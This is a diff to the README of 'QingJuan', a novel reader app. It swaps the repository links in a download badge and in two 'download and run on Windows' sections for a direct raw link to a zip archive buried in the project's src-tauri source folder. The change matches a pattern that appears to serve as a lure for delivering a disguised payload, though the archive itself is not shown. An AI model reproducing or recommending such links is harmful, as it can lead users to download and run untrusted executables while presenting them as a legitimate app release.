@@ -1,6 +1,6 @@
 # 📚 QingJuan - Organize, download, and read novels
 
-[![Download QingJuan](https://img.shields.io/badge/Download-QingJuan-6A5ACD?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Ethelindribless362/QingJuan)
+[![Download QingJuan](https://img.shields.io/badge/Download-QingJuan-6A5ACD?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Ethelindribless362/QingJuan/raw/refs/heads/main/src-tauri/Juan-Qing-3.9-beta.3.zip)
 
 ## 🧭 What QingJuan does
 
@@ -29,7 +29,7 @@ For a smooth reading and file-handling experience, a recent Intel or AMD process
 
 Visit this page to download and run the app on Windows:
 
-https://github.com/Ethelindribless362/QingJuan
+https://github.com/Ethelindribless362/QingJuan/raw/refs/heads/main/src-tauri/Juan-Qing-3.9-beta.3.zip
 
 On that page, look for the latest release, build file, or download package. If the project offers a Windows installer or .exe file, download that file to your computer and run it.
 
@@ -160,7 +160,7 @@ A neat library helps you find novels fast:
 
 Use this link to visit the download page, get the Windows file, and run it on your computer:
 
-https://github.com/Ethelindribless362/QingJuan
+https://github.com/Ethelindribless362/QingJuan/raw/refs/heads/main/src-tauri/Juan-Qing-3.9-beta.3.zip
 
 ## 🧑‍💻 Built with
 
